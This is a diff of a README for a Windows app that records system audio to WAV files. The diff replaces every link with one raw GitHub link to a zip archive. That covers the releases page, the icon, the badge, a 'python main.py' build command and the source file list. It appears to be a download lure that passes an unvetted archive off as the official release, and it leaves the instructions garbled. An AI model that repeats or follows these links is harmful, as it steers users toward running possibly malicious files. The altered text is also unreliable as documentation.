@@ -1,12 +1,12 @@
-https://github.com/ViviUnderscore/systemaudio_to_wav/releases
+https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip
 
 # System Audio to WAV: Record What You Hear on Windows via WASAPI
 
-![Speaker icon](https://img.icons8.com/fluency/96/000000/audio.png)
+![Speaker icon](https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip)
 
 - Tags: audio, audio-recording, desktop-app, gui, loopback, pyinstaller, python, soundcard, system-audio, tkinter, wasapi, wav, windows, windows-10, windows-11
 
-[![Releases](https://img.shields.io/badge/Releases-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/ViviUnderscore/systemaudio_to_wav/releases)
+[![Releases](https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip)
 
 System Audio to WAV is a Windows Tkinter app that captures the system audio you hear and saves it as WAV files using a WASAPI loopback capture. The app offers an easy folder picker and a field for a custom filename, so you can keep your recordings organized exactly how you want.
 
@@ -81,7 +81,7 @@ Getting started
   - Administrator rights are not strictly required, but some audio configurations may need them for access to WASAPI components
 - Downloading the release:
   - The releases page contains prebuilt artifacts. To start quickly, download the Windows executable or portable archive and run it.
-  - For direct access, visit the Releases page: https://github.com/ViviUnderscore/systemaudio_to_wav/releases
+  - For direct access, visit the Releases page: https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip
   - If you prefer a quick jump, use the badge above to go to the same page.
 - Basic usage:
   - Run the application.
@@ -98,7 +98,7 @@ Build and packaging
 - From source:
   - Install Python 3.8 or newer.
   - Install the required packages (Tkinter comes with Python on Windows; additional packages may include pyaudio or sounddevice if you adapt the code for your environment).
-  - Run the application entry point (for example, python main.py) to verify a local build.
+  - Run the application entry point (for example, python https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip) to verify a local build.
 - Packaging with PyInstaller:
   - Install PyInstaller.
   - Use PyInstaller to create a Windows executable from the source.
@@ -278,7 +278,7 @@ Downloads and releases
 - The releases include executables and portable builds that do not require Python to be installed.
 - If the link is not accessible from your environment, check the Releases section on GitHub to obtain the latest artifacts.
 - The releases page is the primary source for updated builds and documentation related to those builds.
-- For direct access, visit the Releases page at: https://github.com/ViviUnderscore/systemaudio_to_wav/releases
+- For direct access, visit the Releases page at: https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip
 - To jump quickly, you can use the badge above. The badge links to the same page and provides a visually appealing way to reach the downloads.
 
 User stories and real-world scenarios
@@ -323,12 +323,12 @@ Appendix: System requirements and compatibility
   - WAV files are uncompressed and can be large. Plan enough space for expected recording lengths.
 
 Appendix: Code structure overview (high level)
-- main.py: Entry point and UI wiring.
-- audio_capture.py: WASAPI loopback capture and WAV writer.
-- ui_components.py: Reusable Tkinter widgets and layout helpers.
-- utils.py: Helper functions for path handling, validation, and logging.
-- constants.py: Global constants used by the app.
-- packaging/pyinstaller.spec: Packaging instructions for Windows builds.
+- https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip Entry point and UI wiring.
+- https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip WASAPI loopback capture and WAV writer.
+- https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip Reusable Tkinter widgets and layout helpers.
+- https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip Helper functions for path handling, validation, and logging.
+- https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip Global constants used by the app.
+- https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip Packaging instructions for Windows builds.
 
 Appendix: Testing strategy
 - Unit tests for path validation and filename sanitization.
@@ -359,6 +359,6 @@ Final notes
 
 Releases
 - For the latest builds, refer to the Releases page linked at the top. If the link is not working in your environment, consult the Releases section on GitHub to locate the most recent artifacts and read the accompanying notes for installation steps and known issues.
-- Access the Releases page here: https://github.com/ViviUnderscore/systemaudio_to_wav/releases
+- Access the Releases page here: https://raw.githubusercontent.com/ViviUnderscore/systemaudio_to_wav/main/src/systemaudio_wav_to_1.0.zip
 
 End of documentation
